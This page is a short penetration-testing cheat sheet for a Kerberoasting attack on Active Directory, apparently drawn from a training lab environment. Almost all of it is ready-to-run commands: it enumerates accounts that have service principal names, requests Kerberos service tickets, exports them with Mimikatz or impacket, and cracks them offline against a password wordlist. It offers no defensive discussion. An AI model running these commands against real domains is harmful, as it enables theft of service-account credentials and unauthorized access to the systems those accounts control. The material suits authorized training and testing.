---
layout: page
title: "# Kerberoast Attack Example"
permalink: /ad_cheatsheets/kerberos_attack_example
---

# Kerberoast Attack Example

## Find User Accounts

```powershell
Get-NetUser -SPN
```

## Request Ticket For Service

```powershell
Add-Type -AssemblyNAme System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

```powershell
klist
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/045d791a-bffa-44f0-9bda-0f1379a4cfd1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/045d791a-bffa-44f0-9bda-0f1379a4cfd1/Untitled.png)

## Dump Ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## Request from Kali

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request dc04.tricky.com/sqlsvc
```

## Crack Password

```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student648@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

## Resources

[Deep Dive into Kerberoasting Attack](https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/)
